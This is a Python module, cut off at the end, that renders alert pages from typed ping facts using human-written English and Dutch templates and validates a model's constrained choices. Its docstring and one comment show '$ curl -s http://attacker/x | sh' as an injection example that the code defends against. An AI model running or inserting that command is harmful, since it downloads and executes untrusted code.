"""Turn a chosen selection over typed ping facts into the page text, in the
reader's own language, out of sentences a human wrote.

The model never writes a word of the page. It picks: which ping leads, which
ASPECT of that ping is the news, and which other pings ride along and how they
relate. Every one of those is an enum over this batch, so the whole space of
pages is finite and `every_selection` can walk it. What comes out is a template
from the catalogue below, filled only from fields on `ping_facts.PingFact`.

That is the point. A no-tools loop cannot check anything, so under the house rules
clause 1 it may only restate what a deterministic block already carries. The
old flusher handed the model the raw ping body and asked for prose, which is
the same clause broken at the source: a body is not a typed field, and a model
reading 30 lines of journal tail will name a cause it cannot check. Here there
is no path from a body to the page at all.

Two rules are properties of the catalogue rather than of any one page, and hold
for every template:

- No contents verb. A template never claims what a log "shows" or "contains".
  Nothing in this module read a log; the sender did.
- No causal connector. A template never says "because", "due to" or "points
  to". A cause is a check nobody ran.

Aspect licensing is structural, not advisory. `parse_choice` refuses a
selection whose aspect the lead fact does not license, so "this keeps coming
back" is unsayable about a ping whose history could not be read, and "first
time" is unsayable about a history that was never queried. That conflation is
the bug this replaces: an unknown history rendered as a first
occurrence.

`render` licenses the same two things AGAIN, against the same facts: the aspect
it leads with and the relation each ride-along line claims. Licensing at the
parse boundary only is a promise the module keeps on one route, and a promise
kept on one route is not a property of the module: a caller that renders a
selection it did not parse (a replayed audit row, a test, the next caller
written) reached templates the facts do not carry, and "Ping 0 on this subject"
about a history nobody looked up is what that looks like on a phone.
Unlicensed here is not fatal, it is dropped: the lead falls back to the
plain failure line every fact licenses, and a ride-along line goes away.

There is no command on this page. A check line printed a command a sender was
read as having offered, and `ping_facts.parse` fills `runbook` from no body at
all now, because only the sender knows which of its lines is an instruction, so
no check line could render. A sender may now say so in a field of its own
(`ping_facts.marked`), and the line is still not back: a command is the one
value on a page that a reader is meant to RUN, so the guard that decides
whether one is safe to print has to be rebuilt before the sentence returns,
and a list of English prose words is not that guard: it cannot tell a
sentence shaped like a command ("docker logs showed nothing useful") from a
command. A guard that looks like protection and is not
is worse than none. The line comes back when the senders are typed, from a field the sender marked rather than from a shape recognised
in prose.

A page is line-oriented, so a value carrying a newline of its own writes lines
this module did not write: a ping subject holding one could put a
"$ curl -s http://attacker/x | sh" line on a phone of its own accord. So every
value crosses `_page_value` on its way into a template and comes out as one
line of bounded length. Nothing else interpolates a value into page text, which
is what makes that door the whole of the rule rather than the first of several,
and `PAGE_MAX_CHARS` bounds what the sentences add up to.

There is deliberately no `recovered` relation. No sender in this system emits a
recovery ping, so a recovery is not expressible here and must not be.

Ride-along lines that would say the same thing are FOLDED into one line naming
every moment. A deploy gate that goes red every couple of minutes would
otherwise put one sentence on a page four times over with four different
stamps in it, most of the page being the same fact.
A fold is only ever a fold. Two lines fold exactly when the words a reader
would see are identical apart from the moment, the count and every moment stay
on the page, and a fold that will not render falls back to saying each line on
its own, because dropping a ping to save a repetition is the wrong way round.

`floor()` is the safety net for every path that does not end in a valid
selection: a faulted model, a refused choice, an empty batch. Under the house rules
clause 6 a guard that can suppress a report is a bug, so `floor` never raises
and never returns an empty string.

The floor is also the page a reader is most likely to be handed, and the caller
treats what it returns as the page for those pings: it audits it and clears the
pen. So the floor may state nothing about the batch it did not itself just
render. Its pieces are rendered and guarded one by one rather than in one try
block, the line saying a batch held nothing readable is reachable only for a
batch that held nothing at all, and when even the pieces fail it says that the
page could not be assembled rather than that there was nothing in it. It also
runs on a storm, so it deduplicates its subjects, names at most
`_FLOOR_MAX_SUBJECTS` of them inside a character budget, and states the counts
BEFORE that list, so a subject the budget left out is still a number the reader
has.

FAILURE POLICY: Tier-2 degrade, never drop. `parse_choice` fails loud with
`InvalidChoice` so the caller can fall to `floor`; `floor` itself swallows and
logs, because it is the last thing standing between a failure and silence.
"""
from __future__ import annotations

from apps.assistant.shared.zone import LOCAL_ZONE_NAME

import dataclasses
import logging
import re
from collections.abc import Iterator
from dataclasses import dataclass
from datetime import datetime, timezone
from types import SimpleNamespace
from typing import Any, Literal
from zoneinfo import ZoneInfo

from apps.assistant.core import outbound as _outbound
from apps.assistant.core import people as _people
from apps.assistant.core import ping_facts as _ping_facts
from apps.assistant.core import state as _state

log = logging.getLogger("openclaw.page_render")

TOOL_NAME = "choose_page"

# The clock the reader is on. One reader, one zone: the pen pages a phone in
# the owner's zone (ASSISTANT_TIMEZONE).
_LOCAL_ZONE = LOCAL_ZONE_NAME

ASPECTS = frozenset(
    {"failure", "escalation", "first_seen", "blocks_deploy", "incomplete"}
)

# The one aspect every fact licenses: a ping is a report of a failure, which is
# what makes it the fallback for a lead sentence and the floor's own aspect.
_ALWAYS_LICENSED_ASPECT = "failure"
RELATIONS = frozenset({"same_cause", "same_subject", "also_firing"})

# The languages the catalogue is written in. A reader the registry does not
# declare gets the first one; see `page_language`.
LANGUAGES = ("en", "nl")


class InvalidChoice(Exception):
    """The model picked something this batch does not license."""


@dataclass(frozen=True)
class Batch:
    """What the floor counted about the batch, so its sentences can say it.

    Both numbers are counted from the facts the floor has in hand, which is the
    whole reason it is allowed to state them. `subject_count` counts subjects as
    their senders wrote them, before the trim that fits one on a page, so it is
    a count of what arrived rather than a count of what the page found room to
    name.
    """

    ping_count: int
    subject_count: int


@dataclass(frozen=True)
class Repeat:
    """How many identical ride-along lines a page folded into one, and when.

    `moments` is already page text: the stamps of the folded lines, written out
    the way a person writes a list. `times` counts them, and it is on the page
    because that list is a value like any other and the door cuts it at
    `VALUE_MAX_CHARS`; a reader handed a cut list still has the number.
    """

    times: int
    moments: str


@dataclass(frozen=True)
class Together:
    """Several ride-along lines that share one moment, as one sentence.

    `Repeat` folds lines that say the SAME thing at different moments; this
    folds lines that say DIFFERENT things at the same moment. Both exist for
    the same reason, which is that a page repeating its own sentence structure
    stops being read. Two pings arriving in the same second would otherwise
    make the page say "Also in this batch: ..." twice, once per subject, each
    with its own copy of the stamp.

    `subjects` is already page text: the senders' own subjects, written out the
    way a person writes a list, and cut at `VALUE_MAX_CHARS` like any other
    value. Nothing here rewords a subject; a sender's headline is the sender's.
    """

    subjects: str
    count: int


@dataclass(frozen=True)
class Selection:
    verdict: Literal["page", "silent"]
    lead: int | None
    aspect: str | None
    also: tuple[tuple[int, str], ...]


SILENT = Selection(verdict="silent", lead=None, aspect=None, also=())


# ---------------------------------------------------------------------------
# The catalogue. Every string below was written by a human. Slots are field
# paths on the dataclasses in `ping_facts` (plus `batch` for the floor's two
# counts), and nothing else is ever substituted into them.
#
# Each entry holds its variants most-specific first, and a variant is used only
# when every slot in it resolves to something non-empty. So the last variant of
# each tuple leans on fields that always carry a value, and a field the sender
# never filled drops the sentence rather than putting the word "None" on a
# phone.
# ---------------------------------------------------------------------------

# The lead sentence, one entry per aspect. The aspect IS the news; everything
# the sender parsed rides in DETAILS below, so no fact is said twice.
TEMPLATES: dict[str, dict[str, tuple[str, ...]]] = {
    "en": {
        "failure": (
            "{display_subject}. At {observed_at}.",
        ),
        "escalation": (
            (
                "{display_subject}. At {observed_at}. {history.nth_time} time on this "
                "subject, the first at {history.first_seen_at}, the last one to reach "
                "you at {history.last_delivered_at}."
            ),
            (
                "{display_subject}. At {observed_at}. {history.nth_time} time on this "
                "subject, the first at {history.first_seen_at}."
            ),
            # No sender in this system fills `first_seen_at`: a pen row is
            # stamped when the flush ran, not when the ping arrived, and
            # `notify_flush` drops the sentence rather than dating a first
            # sighting off the wrong clock. Without this variant the delivery
            # stamp it DOES fill could never reach a page, because every
            # sentence carrying it also asked for the sighting time.
            (
                "{display_subject}. At {observed_at}. {history.nth_time} time on this "
                "subject, the last one reaching you at {history.last_delivered_at}."
            ),
            (
                "{display_subject}. At {observed_at}. {history.nth_time} time on this "
                "subject."
            ),
        ),
        "first_seen": (
            "{display_subject}. The first ping on this subject, at {observed_at}.",
        ),
        "blocks_deploy": (
            (
                "{display_subject}. The sender marked this one as blocking the deploy, "
                "at {observed_at}."
            ),
        ),
        # The sender's own cut, never a loss on the road: a journal tail or a
        # `tail -n 20` is a window it chose. Wording such as "part of it
        # never travelled" would read as a transport fault on every unit-failed
        # page while the body had arrived whole.
        "incomplete": (
            (
                "{display_subject}. The sender passed on only part of its log. At "
                "{observed_at}."
            ),
        ),
    },
    "nl": {
        "failure": (
            "{display_subject}. Om {observed_at}.",
        ),
        "escalation": (
            (
                "{display_subject}. Om {observed_at}. {history.nth_time_nl} keer over "
                "dit onderwerp, de eerste om {history.first_seen_at}, de laatste die "
                "bij je aankwam om {history.last_delivered_at}."
            ),
            (
                "{display_subject}. Om {observed_at}. {history.nth_time_nl} keer over "
                "dit onderwerp, de eerste om {history.first_seen_at}."
            ),
            (
                "{display_subject}. Om {observed_at}. {history.nth_time_nl} keer over "
                "dit onderwerp, de laatste die bij je aankwam om "
                "{history.last_delivered_at}."
            ),
            (
                "{display_subject}. Om {observed_at}. {history.nth_time_nl} keer over "
                "dit onderwerp."
            ),
        ),
        "first_seen": (
            "{display_subject}. De eerste ping over dit onderwerp, om {observed_at}.",
        ),
        "blocks_deploy": (
            (
                "{display_subject}. De afzender markeerde deze als blokkerend voor de "
                "deploy, om {observed_at}."
            ),
        ),
        "incomplete": (
            (
                "{display_subject}. De afzender gaf maar een deel van zijn log mee. "
                "Om {observed_at}."
            ),
        ),
    },
}

# The sentences that follow the lead, in page order. Each is a tuple of
# variants like an aspect, and a detail whose every variant misses a field is
# left out entirely.
#
# FOUR DETAILS ARE LEFT OUT, and what they are is worth keeping
# written down: the commit sha, the exit code, the raw counts and the log path.
# They are what make a page read as machine output. This is what a page
# carrying them looks like on a phone:
#
#   auto-deploy: verification gate RED. At 2026-01-15 02:40 local (01:40
#   UTC). This one needs you now. Commit 0123456789abcdef0123456789abcdef01234567.
#   Exit code 1. The sender pointed at /var/log/harness/auto-deploy.log.
#
# A forty-character sha, an exit code that is 1 for every failure there is, and
# a path on a machine the reader is not sitting at. the house rules already
# bans exactly this from the morning brief, in these words: never "openclaw's
# own bookkeeping, a deploy sha, how an alert was routed, how many components
# were counted". The clause was written for the brief and the pen page needed
# it just as much; the same rule now binds both.
#
# What is left is what a person can use: which host and unit, the error line
# when the sender pulled one out, and whether this is different from the last
# time. The sha is in the deploy log and on the commit page for whoever goes
# looking, which is a thing you do at a desk, not from bed.
#
# One exception, a secret-scan finding, and only as seven characters
# (`PingFact.finding_commit`). The scan pages once per commit under one fixed
# subject, so the commit is what tells two leaks apart; without it two
# findings on two commits read as one leak paged twice.
DETAILS: dict[str, tuple[tuple[str, ...], ...]] = {
    "en": (
        (
            "Host {parsed.host}, unit {parsed.unit}.",
            "Host {parsed.host}.",
            "Unit {parsed.unit}.",
        ),
        ("Commit {finding_commit}.",),
        ('The line the sender pulled out: "{parsed.error_line}".',),
        ("Different from the previous one: {history.changed_tokens}.",),
    ),
    "nl": (
        (
            "Host {parsed.host}, unit {parsed.unit}.",
            "Host {parsed.host}.",
            "Unit {parsed.unit}.",
        ),
        ("Commit {finding_commit}.",),
        ('De regel die de afzender eruit haalde: "{parsed.error_line}".',),
        ("Anders dan de vorige: {history.changed_tokens}.",),
    ),
}

# Relation lines render the fields of the ping that rides along, not the lead's.
# Variants per relation, like the aspects above: the first one whose every slot
# carries a value is the one that is said.
#
# A RELATION LINE NAMES THE VALUE IT IS LICENSED BY. A line saying
# "The same error line or exit code" and then printing the SUBJECT would be a
# sentence structurally unable to show either of them, handing the reader back
# the alert name of the sentence before it. `licenses_relation` reads exactly two fields for this relation, so
# the line says one of them.
#
# Both fields have a variant, and the error line goes first, because an error
# line says more than a code that is 1 for every failure there is.
# `ping_facts.parse` fills `error_line` with None on every route through a
# BODY, since no reading of a body says which of its lines the sender meant as
# its error message. What reaches the error-line variant is a sender marking
# the line itself (`ping_facts.marked`). The exit-code variant stays second
# and stays reachable: `licenses_relation` allows `same_cause` on either value,
# and most senders mark neither.
#
# AND IT NAMES THE PING IT RIDES ON. Without the subject, `_folded` saw two
# riders about two different units as the same sentence: two
# unrelated MCP failures could become one "The same exit code, 0, 2 times"
# line with neither unit on the page.
RELATION_TEMPLATES: dict[str, dict[str, tuple[str, ...]]] = {
    "en": {
        "same_cause": (
            'The same line: "{parsed.error_line}", from "{display_subject}", at '
            "{observed_at}.",
            'The same exit code, {parsed.exit_code}, from "{display_subject}", at '
            "{observed_at}.",
        ),
        "same_subject": ("The same subject, at {observed_at}.",),
        "also_firing": (
            'Also in this batch: "{display_subject}", at {observed_at}.',
        ),
    },
    "nl": {
        "same_cause": (
            'Dezelfde regel: "{parsed.error_line}", van "{display_subject}", om '
            "{observed_at}.",
            'Dezelfde exitcode, {parsed.exit_code}, van "{display_subject}", om '
            "{observed_at}.",
        ),
        "same_subject": ("Hetzelfde onderwerp, om {observed_at}.",),
        "also_firing": (
            'Ook in deze batch: "{display_subject}", om {observed_at}.',
        ),
    },
}

# The same lines for a page that would otherwise say one of them several times,
# differing in nothing but the moment. Each one opens on the words its
# single-line counterpart opens on, so the sentence a reader recognises as a
# relation reads the same whether it stands for one ping or for five.
# Several DIFFERENT ride-along subjects that arrived at one moment, as one
# sentence naming each. The counterpart of REPEATED_RELATION_TEMPLATES below,
# which folds the same sentence across several moments; this folds several
# sentences into one moment.
#
# Only `also_firing` has one, and that is not an oversight. The other relations
# assert something about the LEAD ("the same line", "the same exit code"), so a
# list under them would be claiming that relation holds between the lead and
# each subject in the list, which is a claim per pair that nothing checks.
# `also_firing` asserts only that these arrived together, which is exactly what
# a list of them says.
TOGETHER_RELATION_TEMPLATES: dict[str, dict[str, tuple[str, ...]]] = {
    "en": {
        "also_firing": ("Also at {observed_at}: {together.subjects}.",),
    },
    "nl": {
        "also_firing": ("Ook om {observed_at}: {together.subjects}.",),
    },
}

REPEATED_RELATION_TEMPLATES: dict[str, dict[str, tuple[str, ...]]] = {
    "en": {
        "same_cause": (
            (
                'The same line: "{parsed.error_line}", from "{display_subject}", '
                "{repeat.times} times: {repeat.moments}."
            ),
            (
                'The same exit code, {parsed.exit_code}, from "{display_subject}", '
                "{repeat.times} times: {repeat.moments}."
            ),
        ),
        "same_subject": (
            "The same subject, {repeat.times} times: {repeat.moments}.",
        ),
        "also_firing": (
            (
                'Also in this batch: "{display_subject}", {repeat.times} '
                "times: {repeat.moments}."
            ),
        ),
    },
    "nl": {
        "same_cause": (
            (
                'Dezelfde regel: "{parsed.error_line}", van "{display_subject}", '
                "{repeat.times} keer: {repeat.moments}."
            ),
            (
                'Dezelfde exitcode, {parsed.exit_code}, van "{display_subject}", '
                "{repeat.times} keer: {repeat.moments}."
            ),
        ),
        "same_subject": (
            "Hetzelfde onderwerp, {repeat.times} keer: {repeat.moments}.",
        ),
        "also_firing": (
            (
                'Ook in deze batch: "{display_subject}", {repeat.times} keer: '
                "{repeat.moments}."
            ),
        ),
    },
}

# How a folded line writes its moments out: a comma between them and a word
# before the last one, which is the way a person writes a list.
MOMENT_SEPARATOR = ", "
MOMENT_LAST_JOIN: dict[str, str] = {"en": " and ", "nl": " en "}

FLOOR_MORE: dict[str, str] = {
    "en": "Other subjects in this batch:",
    "nl": "Andere onderwerpen in deze batch:",
}

# What the floor says about the size of the batch. Stated rather than pasted:
# a storm is the same subject forty times, and forty subject lines is not a
# page. Two written lines rather than one because "on 1 subjects" is not a
# sentence a person wrote.
FLOOR_COUNT: dict[str, str] = {
    "en": "That is {batch.ping_count} pings in this batch, on "
          "{batch.subject_count} subjects.",
    "nl": "Dat zijn {batch.ping_count} pings in deze batch, over "
          "{batch.subject_count} onderwerpen.",
}
FLOOR_ONE_SUBJECT: dict[str, str] = {
    "en": "That is {batch.ping_count} pings in this batch, all on one subject.",
    "nl": "Dat zijn {batch.ping_count} pings in deze batch, allemaal over "
          "hetzelfde onderwerp.",
}

# The claim that the batch held nothing readable. It is TRUE for an empty batch
# and for nothing else, so it is reachable from one branch only: said over a
# batch holding readable pings, it would clear those pings from the pen on the
# strength of a false sentence.
NOTHING_READABLE: dict[str, str] = {
    "en": "A pen flush ran with no readable ping in it.",
    "nl": "Een pen-flush draaide zonder leesbare ping erin.",
}

# The last line standing. It says what this module knows for certain at that
# point, which is what it could not do, and says nothing about the pings: a
# batch that reaches here still holds whatever it holds.
PAGE_NOT_ASSEMBLED: dict[str, str] = {
    "en": "A pen flush ran and this page could not be assembled.",
    "nl": "Een pen-flush draaide en deze pagina kon niet worden opgebouwd.",
}


def catalogue(language: str) -> tuple[str, ...]:
    """Every template string this module can put on a page, for one language.

    The banned-word rules are properties of this whole set, not of any single
    page, so the test asserts over exactly what this returns.
    """
    aspects = tuple(
        variant for variants in TEMPLATES[language].values() for variant in variants
    )
    details = tuple(variant for detail in DETAILS[language] for variant in detail)
    relations = tuple(
        variant
        for table in (RELATION_TEMPLATES, REPEATED_RELATION_TEMPLATES)
        for variants in table[language].values()
        for variant in variants
    )
    return aspects + details + relations + (
        FLOOR_MORE[language],
        FLOOR_COUNT[language],
        FLOOR_ONE_SUBJECT[language],
        NOTHING_READABLE[language],
        PAGE_NOT_ASSEMBLED[language],
    )


# ---------------------------------------------------------------------------
# Licensing
# ---------------------------------------------------------------------------


def licenses_aspect(fact: _ping_facts.PingFact, aspect: str) -> bool:
    """Whether this fact carries the state an aspect asserts.

    Each answer is a read of one typed field. `escalation` and `first_seen`
    both need a history that was actually queried, which is what keeps a failed
    history read from rendering as either.
    """
    history = fact.history
    if aspect == "failure":
        return True
    if aspect == "escalation":
        # A second secret-scan ping is a second commit by construction (the
        # scan pages once per commit), so it is a new finding, not a repeat.
        return (
            history.state == "known"
            and history.seen_count > 1
            and fact.finding_commit is None
        )
    if aspect == "first_seen":
        return history.state == "known" and history.seen_count == 1
    if aspect == "blocks_deploy":
        return fact.parsed.blocks_deploy is True
    if aspect == "incomplete":
        return fact.body_complete is False
    return False


def licensed_aspects(fact: _ping_facts.PingFact) -> tuple[str, ...]:
    """The aspects this fact licenses, in a stable order."""
    return tuple(aspect for aspect in sorted(ASPECTS) if licenses_aspect(fact, aspect))


def licenses_relation(
    lead: _ping_facts.PingFact, other: _ping_facts.PingFact, relation: str
) -> bool:
    """Whether the two facts stand in the claimed relation.

    `same_cause` needs a shared value that is actually there: two facts whose
    error lines are both unknown share nothing.
    """
    if relation == "also_firing":
        return True
    if relation == "same_subject":
        return lead.subject == other.subject
    if relation == "same_cause":
        return _shares_error_line(lead, other) or _shares_exit_code(lead, other)
    return False


def _shares_error_line(
    lead: _ping_facts.PingFact, other: _ping_facts.PingFact
) -> bool:
    """Whether both facts carry the same non-empty error line."""
    line = lead.parsed.error_line
    return line is not None and line == other.parsed.error_line


def _shares_exit_code(lead: _ping_facts.PingFact, other: _ping_facts.PingFact) -> bool:
    """Whether both facts carry the same known exit code."""
    code = lead.parsed.exit_code
    return code is not None and code == other.parsed.exit_code


def licensed_relations(
    lead: _ping_facts.PingFact, other: _ping_facts.PingFact
) -> tuple[str, ...]:
    """The relations these two facts license, in a stable order."""
    return tuple(
        relation
        for relation in sorted(RELATIONS)
        if licenses_relation(lead, other, relation)
    )


def licensed_aspect_union(facts: tuple[_ping_facts.PingFact, ...]) -> tuple[str, ...]:
    """Every aspect SOME fact in this batch licenses, in a stable order.

    The union and not the intersection, because the aspect is asked about the
    LEAD and any ping may lead. Never empty for a batch that has pings at all:
    `failure` is licensed by every fact.
    """
    licensed = {aspect for fact in facts for aspect in licensed_aspects(fact)}
    return tuple(aspect for aspect in sorted(ASPECTS) if aspect in licensed)


def licensed_relation_union(
    facts: tuple[_ping_facts.PingFact, ...]
) -> tuple[str, ...]:
    """Every relation SOME ordered pair in this batch licenses, in a stable
    order.

    Ordered pairs, because a relation is read from the lead to the other one
    and the model picks the lead. Empty for a one-ping batch, which has no pair
    in it; never empty from two pings up, since `also_firing` holds between any
    two.
    """
    licensed = {
        relation
        for lead in facts
        for other in facts
        if other.ping_id != lead.ping_id
        for relation in licensed_relations(lead, other)
    }
    return tuple(relation for relation in sorted(RELATIONS) if relation in licensed)


def _licensing_lines(facts: tuple[_ping_facts.PingFact, ...]) -> str:
    """What each ping licenses and what each ordered pair does, as prose for
    the model.

    The enums are the narrowing; this is the same information said in a form
    that names the pings, because an enum the model cannot map back to a ping
    tells it which words exist and not which one to pick. Quadratic in the size
    of the batch, which is the honest cost of saying it per pair: a pen batch
    is a handful of pings.
    """
    lines = [
        f"Ping {fact.ping_id} licenses aspects: "
        + ", ".join(licensed_aspects(fact))
        + "."
        for fact in facts
    ]
    for lead in facts:
        allowed = [
            f"ping {other.ping_id} as " + " or ".join(relations)
            for other in facts
            for relations in (licensed_relations(lead, other),)
            if other.ping_id != lead.ping_id and relations
        ]
        if allowed:
            lines.append(
                f"Leading with ping {lead.ping_id}, these may ride along: "
                + "; ".join(allowed)
                + "."
            )
    return "\n".join(lines)


# ---------------------------------------------------------------------------
# The tool the model calls
# ---------------------------------------------------------------------------


def tool_definition(facts: tuple[_ping_facts.PingFact, ...]) -> dict[str, Any]:
    """The terminal tool for one batch: every field an enum over THESE pings.

    The model cannot name a ping that is not here, an aspect the catalogue has
    no template for, or a relation that does not exist. The description
    restates the rules for the model's benefit; `parse_choice` is what enforces
    them.

    The two vocabulary enums are narrowed to what this batch
    LICENSES rather than to what the module can render: the aspect enum
    is `licensed_aspect_union`, the relation enum `licensed_relation_union`,
    and the ride-along array cannot hold more entries than there are pings
    beside the lead. `parse_choice` is unchanged and stays the only enforcer,
    so this can only remove refusals, never widen what the assistant may say: every
    value still offered was already accepted, and every value withdrawn was
    already refused.

    THE LIMIT, AND IT IS THE INTERESTING HALF. A licence is a property of a
    ping, or of a pair of them, and a schema enum is a property of the batch.
    So a union says "some ping here licenses first_seen" and cannot say which,
    and a model that picks a lead licensing only `failure` with the aspect
    `first_seen` is still refused. The residual refusal path is therefore load
    bearing and stays. What this can do is make the wrong pick rarer, and how
    much rarer is not knowable from here: only a hand-run replay against the
    live model measures it, so nothing in this module claims the picking is
    stopped.
    """
    ping_ids = [fact.ping_id for fact in facts]
    aspects = licensed_aspect_union(facts)
    relations = licensed_relation_union(facts)
    return {
        "name": TOOL_NAME,
        "description": (
            "Choose the page for this batch of system pings. You write no "
            "prose: the wording is written for you, and you pick which ping "
            "leads, which aspect of it is the news, and which other pings ride "
            "along. Pick verdict 'silent' when the batch is a repeat "
            "of something already said and nothing about it changed. An "
            "aspect you pick has to be one this ping's own fields carry: "
            "'escalation' and 'first_seen' need a history that was read, "
            "'blocks_deploy' needs the sender to have said so, 'incomplete' "
            "needs a cut body. 'failure' always fits. The lists below say "
            "which ping carries which, and which pings may ride along behind "
            "which lead.\n" + _licensing_lines(facts)
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "verdict": {"type": "string", "enum": ["page", "silent"]},
                "lead": {
                    "type": ["integer", "null"],
                    "enum": [None, *ping_ids],
                    "description": "The ping the page leads with. Null when silent.",
                },
                "aspect": {
                    "type": ["string", "null"],
                    "enum": [None, *aspects],
                    "description": (
                        "What about the lead ping is the news. Null when silent."
                    ),
                },
                "also": {
                    "type": "array",
                    "description": (
                        "Other pings in this batch worth one line each, at most "
                        "one line per ping."
                    ),
                    # One line per ping and never the lead itself, so a batch of
                    # one ping cannot fill this at all.
                    "maxItems": max(len(ping_ids) - 1, 0),
                    "items": {
                        "type": "object",
                        "properties": {
                            "ping_id": {"type": "integer", "enum": ping_ids},
                            # A one-ping batch licenses no relation, and an empty
                            # enum is not a schema: nothing may be in this array
                            # there anyway, so the unreachable field keeps the
                            # full set rather than becoming a list that matches
                            # nothing.
                            "relation": {
                                "type": "string",
                                "enum": list(relations) or sorted(RELATIONS),
                            },
                        },
                        "required": ["ping_id", "relation"],
                    },
                },
            },
            "required": ["verdict", "lead", "aspect", "also"],
        },
    }


def parse_choice(
    tool_input: dict[str, Any], facts: tuple[_ping_facts.PingFact, ...]
) -> Selection:
    """The model's tool input as a `Selection`, or `InvalidChoice`.

    A silence is normalised rather than refused: refusing one would turn a
    deliberate quiet into a page, which is the wrong direction to fail in.
    Everything else is checked against the facts, and anything the batch does
    not license raises so the caller can fall to `floor`.
    """
    verdict = tool_input.get("verdict")
    if verdict == "silent":
        return SILENT
    if verdict != "page":
        raise InvalidChoice(f"verdict {verdict!r} is neither page nor silent")

    lead_fact = _lead_fact(tool_input.get("lead"), facts)
    aspect = _checked_aspect(tool_input.get("aspect"), lead_fact)
    also = _checked_also(tool_input.get("also"), lead_fact, facts)
    return Selection(
        verdict="page", lead=lead_fact.ping_id, aspect=aspect, also=also
    )


def _lead_fact(lead: Any, facts: tuple[_ping_facts.PingFact, ...]) -> _ping_facts.PingFact:
    """The fact the page leads with, refused for an id this batch does not hold.

    An out-of-batch id is how a hallucinated ping would enter the page.
    """
    for fact in facts:
        if fact.ping_id == lead:
            return fact
    raise InvalidChoice(f"lead ping {lead!r} is not in this batch")


def _checked_aspect(aspect: Any, lead_fact: _ping_facts.PingFact) -> str:
    """The aspect, refused when the lead fact's own fields do not carry it."""
    if aspect not in ASPECTS:
        raise InvalidChoice(f"aspect {aspect!r} is not an aspect")
    if not licenses_aspect(lead_fact, aspect):
        raise InvalidChoice(
            f"ping {lead_fact.ping_id} does not license aspect {aspect!r}"
        )
    return str(aspect)


def _checked_also(
    also: Any,
    lead_fact: _ping_facts.PingFact,
    facts: tuple[_ping_facts.PingFact, ...],
) -> tuple[tuple[int, str], ...]:
    """The ride-along lines, each refused unless the two facts really stand in
    the claimed relation."""
    if also is None:
        return ()
    if not isinstance(also, (list, tuple)):
        raise InvalidChoice(f"also {also!r} is not a list")
    by_id = {fact.ping_id: fact for fact in facts}
    chosen: list[tuple[int, str]] = []
    for entry in also:
        ping_id = entry.get("ping_id") if isinstance(entry, dict) else None
        relation = entry.get("relation") if isinstance(entry, dict) else None
        if ping_id not in by_id:
            raise InvalidChoice(f"also ping {ping_id!r} is not in this batch")
        if ping_id == lead_fact.ping_id:
            raise InvalidChoice("the lead ping cannot also ride along with itself")
        if any(ping_id == taken for taken, _relation in chosen):
            raise InvalidChoice(f"also ping {ping_id!r} rides along twice")
        if relation not in RELATIONS:
            raise InvalidChoice(f"relation {relation!r} is not a relation")
        if not licenses_relation(lead_fact, by_id[ping_id], relation):
            raise InvalidChoice(
                f"pings {lead_fact.ping_id} and {ping_id} do not license "
                f"relation {relation!r}"
            )
        chosen.append((int(ping_id), str(relation)))
    return tuple(chosen)


def every_selection(facts: tuple[_ping_facts.PingFact, ...]) -> Iterator[Selection]:
    """Every selection this batch licenses, silence included.

    Finite by construction: the lead is one of the facts, the aspect one this
    fact licenses, and each other fact contributes either nothing or one
    licensed relation. A test that exhausts this iterator is a test over the
    whole space of pages, which is how a claim like "a recovery is not
    expressible" gets proven rather than asserted.
    """
    yield SILENT
    for lead_fact in facts:
        others = [fact for fact in facts if fact.ping_id != lead_fact.ping_id]
        for aspect in licensed_aspects(lead_fact):
            for also in _every_also(lead_fact, others):
                yield Selection(
                    verdict="page",
                    lead=lead_fact.ping_id,
                    aspect=aspect,
                    also=also,
                )


def _every_also(
    lead_fact: _ping_facts.PingFact, others: list[_ping_facts.PingFact]
) -> Iterator[tuple[tuple[int, str], ...]]:
    """Every combination of ride-along lines: each other fact is absent or
    carries exactly one of the relations it licenses."""
    if not others:
        yield ()
        return
    head, rest = others[0], others[1:]
    options: list[tuple[tuple[int, str], ...]] = [()]
    for relation in licensed_relations(lead_fact, head):
        options.append(((head.ping_id, relation),))
    for tail in _every_also(lead_fact, rest):
        for option in options:
            yield option + tail


# ---------------------------------------------------------------------------
# Rendering
# ---------------------------------------------------------------------------

_SLOT_RE = re.compile(r"\{([a-z_]+(?:\.[a-z_]+)?)\}")

# The slot that makes two otherwise identical relation lines two lines. The
# fold reads a template without it to decide what two lines have in common.
_MOMENT_SLOT = "{observed_at}"

# The fields a fact carries, read off the dataclass so a folded line can be
# filled from a ping and the fold's counts at once.
_FACT_FIELDS = tuple(
    field.name for field in dataclasses.fields(_ping_facts.PingFact)
)

# THE DOOR. Every value that reaches a reader crosses `_page_value`, and comes
# out one line of at most this many characters. Two things come through an
# unbounded value: a newline, which writes a line the renderer did not write (a
# subject carrying "\n$ curl ... | sh" would print exactly that line), and
# length, where one long subject would render a page of thousands of
# characters.
VALUE_MAX_CHARS = 120

# How long a page may be. A page is one message on a phone, and neither one
# long field nor one long batch may decide its size, so the sentences are
# fitted to this and the ones that do not fit are dropped whole. Every sentence
# the catalogue can render fits here, which is asserted over the catalogue
# rather than hoped for, so the budget is a property of the page and not only
# of its first sentence.
PAGE_MAX_CHARS = 1200

_WHITESPACE_RE = re.compile(r"\s+")

# openclaw's own words for openclaw's own state. `kind` is this module's
# classification of a subject line, `severity` its ranking of one, and
# `history.state` and `body_complete` are its record of what a lookup and a
# parse came back with. None of them was written for a reader, so a template
# slotting one puts "secret_scan_hit" or "unknown" on a phone in a vocabulary
# nobody taught anybody. They are not renderable as bare words. A page that
# wants to say one of them says it in a sentence a human wrote per value, into
# the catalogue above, the way every other sentence here was written.
UNSAYABLE_FIELDS = frozenset({"kind", "severity", "history.state", "body_complete"})


def slots_in(template: str) -> tuple[str, ...]:
    """The field paths a template fills, in the order they appear."""
    return tuple(_SLOT_RE.findall(template))


def _page_value(text: str) -> str:
    """One value as page text: a single line of bounded length.

    Every run of whitespace, a newline included, becomes one space, and what is
    left is cut to `VALUE_MAX_CHARS`. A cut value ends in an ellipsis, so a
    reader sees that it was cut rather than reading a sender's headline that
    stops mid-word as the whole of it.
    """
    single_line = _WHITESPACE_RE.sub(" ", text).strip()
    if len(single_line) <= VALUE_MAX_CHARS:
        return single_line
    return single_line[: VALUE_MAX_CHARS - 1].rstrip() + "\u2026"


def _fitting(pieces: list[str], separator: str, budget: int) -> list[str]:
    """The leading pieces that fit `budget` once joined by `separator`.

    Whole pieces, in the order given, stopping at the first that does not fit.
    The first non-empty piece is kept whatever its length, so a budget smaller
